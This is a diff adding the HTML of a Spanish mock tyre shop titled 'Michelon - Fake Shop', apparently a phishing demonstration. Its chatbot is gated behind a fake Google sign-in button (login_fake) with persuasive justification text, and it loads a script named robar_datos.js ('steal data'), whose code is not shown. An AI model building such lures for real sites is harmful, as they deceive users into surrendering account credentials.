@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="es-ES">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="description" content="Tu tienda de neumáticos de confianza. Especialistas en venta, montaje y asesoramiento de neumáticos para todo tipo de vehículos. Calidad, seguridad y atención personalizada para que siempre ruedes con tranquilidad.">
+        <meta name="author" content="v4tox3n">
+        <title>Michelon - Fake Shop</title>
+        <link rel="stylesheet" href="styles/style.css">
+        <link rel="icon" href="assets/others/logo.ico">
+        <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    </head>
+
+    <body>
+        <header class="header">
+            <div class="logo"><a href="/">Michelon Shop</a></div>
+            <nav>
+                <ul>
+                    <li><a href="#inicio">Inicio</a></li>
+                    <li><a href="#productos">Nuestros productos</a></li>
+                    <li><a href="#sobre-nosotros">Sobre nosotros</a></li>
+                    <li><a href="#contacto">Contáctanos</a></li>
+                    <li><a href="#faq">FAQ</a></li>
+                </ul>
+            </nav>
+            <div class="cart-icon"><a href="carrito.html">Carrito 🛒</a></div>
+        </header>        
+
+        <header class="chat-bot" onclick="activarChat()">
+            <img src="assets/others/chat-bot-img.png">
+        </header>
+
+        <div class="chatbot-container" id="chatbotContainer">
+            <div class="chat-header">
+                🤖 ChatBot
+                <button class="clear-btn" onclick="clearChat()">Borrar</button>
+            </div>
+            <div class="chat-mensajes" id="chatMensajes">
+                <div class="mensaje bot bienvenida-bot"></div>
+            </div>
+            <div class="chat-input">
+                <input type="text" id="userInput" placeholder="Escribe un mensaje..." />
+                <button onclick="sendMessage()">Enviar</button>
+            </div>
+        </div>
+
+        <div class="chatbot-container2" id="chatbotContainer2">
+            <button class="google-btn" onclick="login_fake()">Iniciar sesión con Google</button>
+            <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+            <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
+            <a onclick="const elements = document.querySelectorAll('.respuesta-iscg'); for (let e of elements) { e.classList.toggle('active'); }">¿Por qué iniciar sesión con google para usar el chatbot de Michelon?</a>
+            <p class="respuesta-iscg">En esta web debes iniciar sesión con google para usar el chatbot por distintas razones : </p>
+            <p class="respuesta-iscg">1. Garantizar que quién usa el chatbot es una persona real y no un programa informático.</p>
+            <p class="respuesta-iscg">2. Garantizar que la información el chatbot esté protegida y segura.</p>
+            <p class="respuesta-iscg">3. Para retomar conversaciones anteriores guardando el contenido del chat en tu historial.</p>
+            <p class="respuesta-iscg">4. Para actualizar el contenido del chat en tiempo real, ya sea desde tu dispositivo móvil, tablet u ordenador.</p>
+        </div>
+
+        <main>
+            <section class="inicio" id="inicio">
+                <div class="inicio-text">
+                    <h1>Michelon</h1>
+                    <p>Ruedas más suaves que el algodón.</p>
+                </div>
+            </section>
+
+            <section class="productos" id="productos">
+                <h2 class="heading">Nuestros Productos</h2>
+
+                <div class="content">
+                    <div class="card">
+                        <img src="assets/ruedas/verano.jpg">
+                        <h3>Neumático Verano</h3>
+                        <p>Neumático de verano con un diseño optimizado para temperaturas altas. Sus canales ayudan a evacuar el agua y mejorar la estabilidad en carreteras secas y mojadas.</p>
+                        <button class="btn">Comprar</button>
+                    </div>
+                    <div class="card">
+                        <img src="assets/ruedas/invierno.jpg">
+                        <h3>Neumático Invierno</h3>
+                        <p>Neumático de invierno con un dibujo profundo y múltiples laminillas en la banda de rodadura. Proporciona mejor tracción en superficies frías, con nieve o hielo.</p>
+                        <button class="btn">Comprar</button>
+                    </div>
+                    <div class="card">
+                        <img src="assets/ruedas/all-season.jpg">
+                        <h3>Neumático All-Season</h3>
+                        <p>Neumático para todas las estaciones con un diseño equilibrado. Tiene un patrón de banda de rodadura moderado para ofrecer un buen rendimiento en seco, mojado e incluso nieve ligera.</p>
+                        <button class="btn">Comprar</button>
+                    </div>
+                    <div class="card">
+                        <img src="assets/ruedas/compe.jpg">
+                        <h3>Neumático Competición</h3>
+                        <p>Neumático de competición con una banda de rodadura lisa o de bajo relieve. Está diseñado para proporcionar el máximo agarre en circuitos y carreteras secas, optimizando el contacto con el asfalto.</p>
+                        <button class="btn">Comprar</button>
+                    </div>
+                    <div class="card">
+                        <img src="assets/ruedas/compe-montaña.jpg">
+                        <h3>Competición Montaña</h3>
+                        <p>Neumático de competición para terrenos de montaña. Es completamente liso (tipo slick) y parece diseñado para rallyes o competiciones en carretera con máxima adherencia.</p>
+                        <button class="btn">Comprar</button>
+                    </div>
+                </div>
+            </section>
+
+            <section class="sobre-nosotros" id="sobre-nosotros">
+                <h2 class="heading">Sobre Nosotros</h2>
+                
+                <div class="about-us-text">
+                    <p style="color: white; text-shadow: 2px 2px 5px rgba(255, 69, 0, 0.5); font-weight: bold;">Nuestra tienda de neumáticos no es solo un negocio: es el resultado de años de experiencia, esfuerzo y pasión por el mundo del motor. Detrás de cada servicio que ofrecemos, hay un equipo humano comprometido. Conoce a los tres socios fundadores que hacen posible que cada cliente se lleve el mejor producto y una atención de confianza:</p>
+                </div>
+
+                <div class="content">
+                    <div class="card">
+                        <img src="assets/personas/toni.png">
+                        <div class="intro">
+                            <h3>Toni Mayor</h3>
+                            <!-- <p style="font-weight: bold;">Director General de Operaciones</p> -->
+                            <p>Con más de 20 años en el sector, Toni se encarga de que todo funcione como un motor bien ajustado. Supervisa los procesos logísticos, la gestión de stock y la atención al cliente. Su lema: “Un buen neumático puede cambiar tu viaje.”</p>
+                        </div>
+                    </div>
+                    <div class="card">
+                        <img src="assets/personas/diego.png">
+                        <div class="intro">
+                            <h3>Diego Lozano</h3>
+                            <!-- <p style="font-weight: bold;">Director de Estrategia y Expansión</p> -->
+                            <p>Diego es la mente detrás de cada nuevo paso que damos, especialista en gestión operativa y atención al cliente en el sector de neumáticos. Destaca por su eficacia, conocimiento técnico y trato cercano con los clientes.</p>
+                        </div>
+                    </div>
+                    <div class="card">
+                        <img src="assets/personas/adria.png">
+                        <div class="intro">
+                            <h3>Adrià Pons</h3>
+                            <!-- <p style="font-weight: bold;">Responsable Técnico y Calidad</p> -->
+                            <p>Adrià vive entre neumáticos, llaves y calibradores. Él se asegura de que cada producto cumpla con los más altos estándares de seguridad y rendimiento. Su obsesión: que cada cliente salga rodando con confianza</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section class="contact" id="contacto">
+                <div class="content">
+                    <h2 class="heading">Contáctanos</h2>
+                    <form action="" class="contactForm">
+                        <div class="input-box">
+                            <input type="text" placeholder="Nombre" required>
+                            <input type="text" placeholder="Apellido" required>
+                            <input type="email" placeholder="Correo electrónico" required>
+                            <input type="text" placeholder="Asunto" required>
+                        </div>
+        
+                        <textarea name="" id="" cols="30" rows="10" placeholder="Tu mensaje..." required></textarea>
+                        <input type="submit" value="Enviar" class="btn contact-me-submit-button">
+                    </form>
+                </div>
+            </section>
+
+            <section class="faq" id="faq">
+                <div class="content">
+                    <div class="faq-container">
+                        <div class="faq-title">Preguntas Frecuentes</div>
+                    
+                        <div class="faq-item">
+                          <div class="faq-question">¿Ofrecéis más servicios aparte de vender neumáticos?
+                            <span class="faq-icon">+</span>
+                          </div>
+                          <div class="faq-answer">Sí, además de la venta de neumáticos, ofrecemos servicios como montaje, equilibrado, alineación de ruedas, revisión de presión y estado, reparación de pinchazos y más. Visita nuestra tienda física o contáctanos para ver todo lo que podemos hacer por tu vehículo.</div>
+                        </div>
+                    
+                        <div class="faq-item">
+                          <div class="faq-question">¿Hacéis envíos a domicilio?
+                            <span class="faq-icon">+</span>
+                          </div>
+                          <div class="faq-answer">Sí, realizamos envíos a domicilio a toda la península sin costes adicionales. Si quieres hacer el envío a otro país se aplican cargos adicionales. También puedes optar por recoger tu pedido en nuestra tienda o taller si lo prefieres.</div>
+                        </div>
+                    
+                        <div class="faq-item">
+                          <div class="faq-question">¿Puedo devolver los neumáticos si no estoy satisfecho?
+                            <span class="faq-icon">+</span>
+                          </div>
+                          <div class="faq-answer">Por supuesto. Aceptamos devoluciones dentro del plazo establecido (14 días) siempre que los neumáticos no hayan sido montados ni utilizados. Consulta nuestra política de devoluciones o contáctanos para más detalles.</div>
+                        </div>
+
+                        <div class="faq-item">
+                            <div class="faq-question">¿Para que sirve el chatbot de la página web?
+                              <span class="faq-icon">+</span>
+                            </div>
+                            <div class="faq-answer">El chatbot está disponible para ayudarte rápidamente con tus dudas, ya sea sobre qué neumáticos necesitas, disponibilidad, horarios o cómo hacer un pedido. También puede ponerte en contacto con nuestro equipo si necesitas atención personalizada.</div>
+                        </div>
+                      
+                        <div class="faq-item">
+                            <div class="faq-question">¿Trabajáis con marcas específicas?
+                              <span class="faq-icon">+</span>
+                            </div>
+                            <div class="faq-answer">Sí, trabajamos con una amplia variedad de marcas reconocidas en el mercado, como Bridgestone, Pirelli, Continental, Goodyear, Hankook, entre otras. Si estás buscando una marca concreta, puedes consultarla en nuestro catálogo o contactarnos directamente.</div>
+                        </div>
+                      
+                        <div class="faq-item">
+                            <div class="faq-question">¿Cómo sé qué neumáticos necesita mi coche?
+                              <span class="faq-icon">+</span>
+                            </div>
+                            <div class="faq-answer">Puedes encontrar esta información en el manual de tu vehículo, en la ficha técnica o directamente en el lateral de tus neumáticos actuales. Si tienes dudas, nuestro equipo o el chatbot pueden ayudarte a encontrar los adecuados para tu coche.</div>
+                        </div>
+                      </div>
+                      <div class="faq-final"></div>
+                </div>
+            </section>
+        </main>
+
+        <footer>
+            <section class="footer">
+                <div class="container">
+                    <div class="footer-logo">
+                        <div class="div-img" style="background-color: #f7f6f4;"><img src="assets/others/logo2.png"/></div>
+                    </div>
+        
+                    <div style="display: flex; flex-direction: column; justify-content: center; align-items: center;">
+                        <div class="footer-links">
+                            <ul>
+                                <li><a href="#">Política de devoluciones</a></li>
+                                <li><a onclick="ripollet()">Visita nuestra tienda en Ripollet</a></li>
+                            </ul>
+                        </div>
+                        <br>
+                        <div class="footer-social">
+                            <a class="facebook" onclick="alert('No disponible');"><box-icon type='logo' name='facebook'></box-icon><span>Facebook</span></a>
+                            <a class="instagram" onclick="alert('No disponible');"><box-icon type='logo' name='instagram'></box-icon><span>Instagram</span></a>
+                            <a class="twitter" onclick="alert('No disponible');"><box-icon type='logo' name='twitter'></box-icon><span>Twitter</span></a>
+                        </div>                        
+                    </div>
+        
+                    <div class="footer-contact">
+                        <p>📍 C/ Afores Ripollet (Barcelona)</p>
+                        <p>✉️ michelon@mejoresneumaticos.com</p>
+                        <div><p>Expertos en neumáticos desde 1995. Calidad, confianza y seguridad en cada kilómetro.</p></div>
+                    </div>
+                </div>
+        
+                <div class="footer-bottom">
+                    <p>&copy; 2025 Neumáticos Michelón. Todos los derechos reservados.</p>
+                </div>
+            </section>
+        </footer>
+        
+
+        <script src="src/script.js"></script>
+        <script src="src/robar_datos.js"></script>
+        <script src="https://unpkg.com/boxicons@2.1.4/dist/boxicons.js"></script>
+        <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+        <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+    </body>
+</html>
